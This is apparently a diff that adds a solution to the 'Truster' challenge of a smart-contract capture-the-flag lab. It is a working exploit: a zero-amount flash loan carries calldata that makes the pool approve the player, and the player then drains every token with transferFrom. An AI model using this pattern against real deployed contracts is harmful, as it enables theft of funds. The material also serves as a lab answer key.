@@ -20,9 +20,14 @@ describe('[Challenge] Truster', function () {
 
         expect(await token.balanceOf(player.address)).to.equal(0);
     });
-
+    // the functionCall data should perform an approval for the attacker to transferFrom the Tokens
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let victimTokenContract = token.connect(player);
+        let victimPoolContract = pool.connect(player);
+        const data = victimTokenContract.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await victimPoolContract.flashLoan(0, victimPoolContract.address, victimTokenContract.address, data);
+        await victimTokenContract.transferFrom(victimPoolContract.address, player.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
